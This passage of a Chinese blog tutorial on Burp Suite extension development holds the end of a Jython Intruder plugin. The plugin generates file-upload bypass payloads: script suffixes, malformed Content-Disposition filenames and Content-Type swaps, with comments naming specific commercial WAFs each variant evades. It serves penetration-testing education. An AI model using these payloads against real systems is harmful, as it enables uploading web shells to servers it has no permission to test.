class="line">Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(&#39;form-data; &#39;, &#39;form-data;&#39;)) # 减少一个空格</span><br><span class="line">TEMP_TEMP_TEMPLATE_SUFFIX &#x3D; TEMP_TEMPLATE_SUFFIX</span><br><span class="line">Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,</span><br><span class="line">&#39;filename&#x3D;&#x3D;&#x3D;zc.&#123;&#125;&#39;.format(</span><br><span class="line">each_suffix))) # 过阿里云waf，删双引号绕过</span><br><span class="line">TEMP_TEMP_TEMPLATE_SUFFIX &#x3D; TEMP_TEMPLATE_SUFFIX</span><br><span class="line">Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,</span><br><span class="line">&#39;filename&#x3D;&#x3D;&#x3D;&quot;zc.&#123;&#125;&#39;.format(</span><br><span class="line">each_suffix))) # 过阿里云waf，少双引号绕过</span><br><span class="line">TEMP_TEMP_TEMPLATE_SUFFIX &#x3D; TEMP_TEMPLATE_SUFFIX</span><br><span class="line">Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,</span><br><span class="line">&#39;filename&#x3D;&#x3D;&#x3D;&quot;zc.&#123;&#125;&quot;&#39;.format(</span><br><span class="line">each_suffix))) # 过阿里云waf，三个等号</span><br><span class="line">TEMP_TEMP_TEMPLATE_SUFFIX &#x3D; TEMP_TEMPLATE_SUFFIX</span><br><span class="line">Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,</span><br><span class="line">&#39;filename&#x3D;&quot;zc.&#123;&#125;\n&quot;&#39;.format(</span><br><span class="line">each_suffix))) # 过阿里云waf，回车</span><br><span class="line">TEMP_TEMP_TEMPLATE_SUFFIX &#x3D; TEMP_TEMPLATE_SUFFIX</span><br><span class="line">Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,</span><br><span class="line">&#39;\nfilename&#x3D;&#x3D;&#x3D;&quot;zc.\n&#123;&#125;&quot;&#39;.format(</span><br><span class="line">each_suffix))) # 过阿里云waf, 三个等号加回车</span><br><span class="line">TEMP_TEMP_TEMPLATE_SUFFIX &#x3D; TEMP_TEMPLATE_SUFFIX</span><br><span class="line">Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,</span><br><span class="line">&#39;filename&#x3D;&quot;zc.\nC.&#123;&#125;&quot;&#39;.format(</span><br><span class="line">each_suffix))) # 过安全狗和云锁waf # 待定，因为没法删掉Content-Type</span><br><span class="line">TEMP_TEMP_TEMPLATE_SUFFIX &#x3D; TEMP_TEMPLATE_SUFFIX</span><br><span class="line">Content_Disposition_payload.append(</span><br><span class="line">TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total, &#39;filename\n&#x3D;&quot;zc.&#123;&#125;&quot;&#39;.format(each_suffix))) # 过百度云waf</span><br><span class="line"></span><br><span class="line">TEMP_TEMP_TEMPLATE_SUFFIX &#x3D; TEMP_TEMPLATE_SUFFIX</span><br><span class="line">Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,</span><br><span class="line">&#39;filename&#x3D;&quot;zc\.&#123;&#125;&quot;&#39;.format(</span><br><span class="line">each_suffix))) # 过硬waf，反斜杠绕过</span><br><span class="line">TEMP_TEMP_TEMPLATE_SUFFIX &#x3D; TEMP_TEMPLATE_SUFFIX</span><br><span class="line">Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,</span><br><span class="line">&#39;filename&#x3D;&#x3D;&#x3D;zczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczczc.&#123;&#125;&#39;.format(</span><br><span class="line">each_suffix))) # 过硬waf，超长文件名</span><br><span class="line">TEMP_TEMP_TEMPLATE_SUFFIX &#x3D; TEMP_TEMPLATE_SUFFIX</span><br><span class="line">Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(&#39;form-data&#39;,</span><br><span class="line">&#39;form-data------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------&#39;)) # 过硬waf，超长-</span><br><span class="line"></span><br><span class="line">TEMP_TEMP_TEMPLATE_SUFFIX &#x3D; TEMP_TEMPLATE_SUFFIX</span><br><span class="line">Content_Disposition_payload.append(TEMP_TEMP_TEMPLATE_SUFFIX.replace(filename_total,</span><br><span class="line">&#39;filename&#x3D;&quot;zc.jpg&quot;;filename&#x3D;&quot;zc.&#123;&#125;&quot;&#39;.format(</span><br><span class="line">each_suffix))) # 双参数</span><br><span class="line"></span><br><span class="line">return Content_Disposition_payload</span><br><span class="line"></span><br><span class="line">def content_type_Fuzz():</span><br><span class="line"># content_type &#x3D; Content-Type: image&#x2F;jpeg</span><br><span class="line">content_type_payload &#x3D; [] # 保存content_type绕过的所有payload列表</span><br><span class="line">Suffix &#x3D; [&#39;asp&#39;, &#39;aspx&#39;, &#39;php&#39;, &#39;jsp&#39;]</span><br><span class="line"># 遍历每个需要测试的上传后缀</span><br><span class="line">for each_suffix in Suffix:</span><br><span class="line">TEMP_TEMPLATE &#x3D; TEMPLATE</span><br><span class="line">TEMP_TEMPLATE_SUFFIX &#x3D; TEMP_TEMPLATE.replace(filename_suffix, each_suffix)</span><br><span class="line">TEMP_TEMPLATE_CONTENT_TYPE &#x3D; TEMP_TEMPLATE_SUFFIX</span><br><span class="line">content_type_payload.append(</span><br><span class="line">TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, &#39;Content-Type: image&#x2F;gif&#39;)) # 修改为image&#x2F;gif</span><br><span class="line">TEMP_TEMPLATE_CONTENT_TYPE &#x3D; TEMP_TEMPLATE_SUFFIX</span><br><span class="line">content_type_payload.append(</span><br><span class="line">TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, &#39;Content-Type: image&#x2F;jpeg&#39;)) # 修改为image&#x2F;jpeg</span><br><span class="line">TEMP_TEMPLATE_CONTENT_TYPE &#x3D; TEMP_TEMPLATE_SUFFIX</span><br><span class="line">content_type_payload.append(</span><br><span class="line">TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, &#39;Content-Type: application&#x2F;php&#39;)) # 修改为image&#x2F;jpeg</span><br><span class="line">TEMP_TEMPLATE_CONTENT_TYPE &#x3D; TEMP_TEMPLATE_SUFFIX</span><br><span class="line">content_type_payload.append(</span><br><span class="line">TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, &#39;Content-Type: text&#x2F;plain&#39;)) # 修改为text&#x2F;plain</span><br><span class="line">TEMP_TEMPLATE_CONTENT_TYPE &#x3D; TEMP_TEMPLATE_SUFFIX</span><br><span class="line">content_type_payload.append(TEMP_TEMPLATE_CONTENT_TYPE.replace(content_type, &#39;&#39;))</span><br><span class="line">TEMP_TEMPLATE_CONTENT_TYPE &#x3D; TEMP_TEMPLATE_SUFFIX</span><br><span class="line">content_type_payload.append(TEMP_TEMPLATE_CONTENT_TYPE.replace(&#39;Content-Type&#39;, &#39;content-type&#39;)) # 改变大小写</span><br><span class="line">TEMP_TEMPLATE_CONTENT_TYPE &#x3D; TEMP_TEMPLATE_SUFFIX</span><br><span class="line">content_type_payload.append(</span><br><span class="line">TEMP_TEMPLATE_CONTENT_TYPE.replace(&#39;Content-Type: &#39;, &#39;Content-Type: &#39;)) # 冒号后面 增加一个空格</span><br><span class="line"></span><br><span class="line">return content_type_payload</span><br><span class="line"></span><br><span class="line">suffix_payload &#x3D; script_suffix_Fuzz()</span><br><span class="line">Content_Disposition_payload &#x3D; CFF_Fuzz()</span><br><span class="line">content_type_payload &#x3D; content_type_Fuzz()</span><br><span class="line"></span><br><span class="line">attackPayloads &#x3D; suffix_payload + Content_Disposition_payload + content_type_payload</span><br><span class="line"></span><br><span class="line">return attackPayloads</span><br><span class="line"></span><br><span class="line">class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory):</span><br><span class="line">def registerExtenderCallbacks(self, callbacks):</span><br><span class="line">self._callbacks &#x3D; callbacks</span><br><span class="line">self._helpers &#x3D; callbacks.getHelpers()</span><br><span class="line">callbacks.setExtensionName(&quot;upload fuzz intruder&quot;)</span><br><span class="line"># 注册payload生成器</span><br><span class="line">callbacks.registerIntruderPayloadGeneratorFactory(self)</span><br><span class="line">print &#39;Load successful - auther:ske\n&#39;</span><br><span class="line"></span><br><span class="line"># 设置payload生成器名字，作为选项显示在Intruder UI中。</span><br><span class="line">def getGeneratorName(self):</span><br><span class="line">return &quot;upload fuzz intruder&quot;</span><br><span class="line"></span><br><span class="line"># 创建payload生成器实例，传入的attack是IIntruderAttack的实例</span><br><span class="line">def createNewInstance(self, attack):</span><br><span class="line">return demoFuzzer(self, attack)</span><br><span class="line"></span><br><span class="line">def getProcessorName(self):</span><br><span class="line">return &quot;upload fuzz&quot;</span><br><span class="line"></span><br><span class="line">def processPayload(self, currentPayload, originalPayload, baseValue):</span><br><span class="line"># print &#39;processPayload called&#39;</span><br><span class="line">payload &#x3D; &quot;&quot;.join(chr(x) for x in baseValue) # 通过该行代码将array(&#39;b&#39;, [106, 112, 103])转换为jpg字符串</span><br><span class="line">attackPayload &#x3D; payload + currentPayload</span><br><span class="line">return attackPayload</span><br><span class="line"></span><br><span class="line"># 继承IIntruderPayloadGenerator类</span><br><span class="line">class demoFuzzer(IIntruderPayloadGenerator):</span><br><span class="line">def __init__(self, extender, attack):</span><br><span class="line">self._extender &#x3D; extender</span><br><span class="line">self._helpers &#x3D; extender._helpers</span><br><span class="line">self._attack &#x3D; attack</span><br><span class="line">self.num_payloads &#x3D; 0 # payload使用了的次数</span><br><span class="line">self._payloadIndex &#x3D; 0</span><br><span class="line">self.attackPayloads &#x3D; [1] # 存储生成的fuzz payloads</span><br><span class="line"></span><br><span class="line"># hasMorePayloads返回一个bool值，如果返回false就不在继续返回下一个payload，如果返回true就返回下一个payload</span><br><span class="line">def hasMorePayloads(self):</span><br><span class="line"># print &quot;hasMorePayloads called.&quot;</span><br><span class="line">return self._payloadIndex &lt; len(self.attackPayloads)</span><br><span class="line"></span><br><span class="line"># 获取下一个payload，然后intruder就会用该payload发送请求</span><br><span class="line">def getNextPayload(self, baseValue):</span><br><span class="line"># print &#39;getNextPayload called&#39;</span><br><span class="line">TEMPLATE &#x3D; &quot;&quot;.join(chr(x) for x in baseValue)</span><br><span class="line">if self._payloadIndex &#x3D;&#x3D; 0:</span><br><span class="line">self.attackPayloads &#x3D; getAttackPayloads(TEMPLATE)</span><br><span class="line"></span><br><span class="line">payload &#x3D; self.attackPayloads[self._payloadIndex]</span><br><span class="line">self._payloadIndex &#x3D; self._payloadIndex + 1</span><br><span class="line"></span><br><span class="line">return payload</span><br><span class="line"></span><br><span class="line"># 清空，以便下一次调用 getNextPayload()再次返回第一个有效负载。</span><br><span class="line">def reset(self):</span><br><span class="line"># print &quot;reset called.&quot;</span><br><span class="line">self.num_payloads &#x3D; 0</span><br><span class="line">return</span><br></pre></td></tr></table></figure>
+
+<p>效果如下：</p>
+<p>加载py脚本</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/64.jpg" alt="图片"></p>
+<p>必须要按照下图格式设置变量</p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/65.jpg" alt="图片"></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/66.jpg" alt="图片"></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/67.jpg" alt="图片"></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/68.jpg" alt="图片"></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/69.jpg" alt="图片"></p>
+<p><img src="/2021/03/31/Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%E9%9B%86%E5%90%88/70.jpg" alt="图片"></p>
+<p>当你学到这里的时候，恭喜你以后遇到上传点，不需要绞尽脑汁的去想各种绕过姿势，只需要不断的完善插件payloads生成，以后上传漏洞就交给插件完成即可。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/03/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%80%BB%E7%BB%93%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/" rel="prev" title="应急响应总结思维导图">
+      <i class="fa fa-chevron-left"></i> 应急响应总结思维导图
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/04/02/BurpSuite%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97%E4%B9%8BAPI%E7%AF%87/" rel="next" title="BurpSuite插件开发指南之API篇">
+      BurpSuite插件开发指南之API篇 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%EF%BC%88%E4%B8%80%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">Burp Extender Apis 插件开发 （一）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E5%AE%89%E8%A3%85%E7%8E%AF%E5%A2%83"><span class="nav-number">1.0.1.</span> <span class="nav-text">0x01 安装环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Burp-Extender-Apis"><span class="nav-number">1.0.2.</span> <span class="nav-text">0x02 Burp Extender Apis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-%E5%B0%9D%E8%AF%95%E5%86%99%E4%B8%80%E4%B8%AA%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84demo"><span class="nav-number">1.0.3.</span> <span class="nav-text">0x03 尝试写一个最简单的demo</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-IBurpExtenderCallbacks"><span class="nav-number">1.0.4.</span> <span class="nav-text">0x04 IBurpExtenderCallbacks</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-processHttpMessage"><span class="nav-number">1.0.5.</span> <span class="nav-text">0x05 processHttpMessage</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-createMenultems"><span class="nav-number">1.0.6.</span> <span class="nav-text">0x06 createMenultems</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%EF%BC%88%E4%BA%8C%EF%BC%89"><span class="nav-number">2.</span> <span class="nav-text">Burp Extender Apis 插件开发 （二）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8FdoPassiveScan"><span class="nav-number">2.0.1.</span> <span class="nav-text">0x01 被动扫描doPassiveScan</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8FdoActiveScan"><span class="nav-number">2.0.2.</span> <span class="nav-text">0x02 主动扫描doActiveScan</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%EF%BC%88%E4%B8%89%EF%BC%89"><span class="nav-number">3.</span> <span class="nav-text">Burp Extender Apis 插件开发 （三）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-IHttpRequestResponse"><span class="nav-number">3.0.1.</span> <span class="nav-text">0x01 IHttpRequestResponse</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-IHttpService"><span class="nav-number">3.0.2.</span> <span class="nav-text">0x02 IHttpService</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-IExtensionHelpers"><span class="nav-number">3.0.3.</span> <span class="nav-text">0x03 IExtensionHelpers</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-IRequestInfo%EF%BC%9A%E8%8E%B7%E5%8F%96%E8%AF%B7%E6%B1%82%E4%BF%A1%E6%81%AF"><span class="nav-number">3.0.4.</span> <span class="nav-text">0x04 IRequestInfo：获取请求信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-IParameter%EF%BC%9A%E8%8E%B7%E5%8F%96%E8%AF%B7%E6%B1%82%E5%8C%85%E7%9A%84%E5%8F%82%E6%95%B0"><span class="nav-number">3.0.5.</span> <span class="nav-text">0x05 IParameter：获取请求包的参数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-IResponseInfo%EF%BC%9A%E8%8E%B7%E5%8F%96%E5%93%8D%E5%BA%94%E4%BF%A1%E6%81%AF"><span class="nav-number">3.0.6.</span> <span class="nav-text">0x06 IResponseInfo：获取响应信息</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%EF%BC%88%E5%9B%9B%EF%BC%89"><span class="nav-number">4.</span> <span class="nav-text">Burp Extender Apis 插件开发 （四）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-buildParameter"><span class="nav-number">4.0.1.</span> <span class="nav-text">0x01 buildParameter</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-updateParameter"><span class="nav-number">4.0.2.</span> <span class="nav-text">0x02 updateParameter</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-makeHttpRequest"><span class="nav-number">4.0.3.</span> <span class="nav-text">0x03 makeHttpRequest</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-%E5%AE%9E%E4%BE%8B"><span class="nav-number">4.0.4.</span> <span class="nav-text">0x04 实例</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%EF%BC%88%E4%BA%94%EF%BC%89"><span class="nav-number">5.</span> <span class="nav-text">Burp Extender Apis 插件开发 （五）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-IScanIssue"><span class="nav-number">5.0.1.</span> <span class="nav-text">0x01 IScanIssue</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B%E6%8F%92%E4%BB%B6"><span class="nav-number">5.0.2.</span> <span class="nav-text">0x02 一个简单的注入检测插件</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%EF%BC%88%E5%85%AD%EF%BC%89"><span class="nav-number">6.</span> <span class="nav-text">Burp Extender Apis 插件开发 （六）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-getContentType"><span class="nav-number">6.0.1.</span> <span class="nav-text">0x01 getContentType</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-stringToBytes"><span class="nav-number">6.0.2.</span> <span class="nav-text">0x02 stringToBytes()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-buildHttpMessage"><span class="nav-number">6.0.3.</span> <span class="nav-text">0x03 buildHttpMessage</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%EF%BC%88%E7%AC%AC%E4%B8%83%E8%AF%BE%EF%BC%89"><span class="nav-number">7.</span> <span class="nav-text">Burp Extender Apis 插件开发 （第七课）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%EF%BC%88%E7%AC%AC%E5%85%AB%E8%AF%BE%EF%BC%89"><span class="nav-number">8.</span> <span class="nav-text">Burp Extender Apis 插件开发 （第八课）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="nav-number">8.0.1.</span> <span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-IIntruderPayloadGeneratorFactory"><span class="nav-number">8.0.2.</span> <span class="nav-text">0x02 IIntruderPayloadGeneratorFactory</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-getGeneratorName"><span class="nav-number">8.0.3.</span> <span class="nav-text">0x03 getGeneratorName</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-createNewInstance"><span class="nav-number">8.0.4.</span> <span class="nav-text">0x04 createNewInstance</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%EF%BC%88%E7%AC%AC%E4%B9%9D%E8%AF%BE%EF%BC%89"><span class="nav-number">9.</span> <span class="nav-text">Burp Extender Apis 插件开发 （第九课）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80-1"><span class="nav-number">9.0.1.</span> <span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-IIntruderPayloadGenerator"><span class="nav-number">9.0.2.</span> <span class="nav-text">0x02 IIntruderPayloadGenerator</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-hasMorePayloads"><span class="nav-number">9.0.3.</span> <span class="nav-text">0x03 hasMorePayloads</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04-getNextPayload"><span class="nav-number">9.0.4.</span> <span class="nav-text">0x04 getNextPayload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05-reset"><span class="nav-number">9.0.5.</span> <span class="nav-text">0x05 reset</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x06-IIntruderPayloadProcessor"><span class="nav-number">9.0.6.</span> <span class="nav-text">0x06 IIntruderPayloadProcessor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x07-getProcessorName"><span class="nav-number">9.0.7.</span> <span class="nav-text">0x07 getProcessorName</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x08-processPayload"><span class="nav-number">9.0.8.</span> <span class="nav-text">0x08 processPayload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x09-%E7%AE%80%E5%8D%95%E7%9A%84demo%E4%BB%A3%E7%A0%81"><span class="nav-number">9.0.9.</span> <span class="nav-text">0x09 简单的demo代码</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Burp-Extender-Apis-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91-%EF%BC%88%E7%AC%AC%E5%8D%81%E8%AF%BE%EF%BC%89"><span class="nav-number">10.</span> <span class="nav-text">Burp Extender Apis 插件开发 （第十课）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-%E5%89%8D%E8%A8%80-2"><span class="nav-number">10.0.1.</span> <span class="nav-text">0x01 前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-Upload-Fuzz%E6%A3%80%E6%B5%8B%E6%8F%92%E4%BB%B6"><span class="nav-number">10.0.2.</span> <span class="nav-text">0x02 Upload Fuzz检测插件</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="一灯和尚"
+      src="/images/46807619.jpg">
+  <p class="site-author-name" itemprop="name">一灯和尚</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">文章</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      大佬们
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://assassins-white.github.io/" title="https:&#x2F;&#x2F;assassins-white.github.io&#x2F;" rel="noopener" target="_blank">白神博客</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.ji4n.cn/" title="http:&#x2F;&#x2F;www.ji4n.cn&#x2F;" rel="noopener" target="_blank">Jen博客</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.le31ei.top/" title="https:&#x2F;&#x2F;blog.le31ei.top&#x2F;" rel="noopener" target="_blank">le31ei博客</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">一灯和尚</span>
+</div>
+  <div class="powered-by">一只安全小菜鸡
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
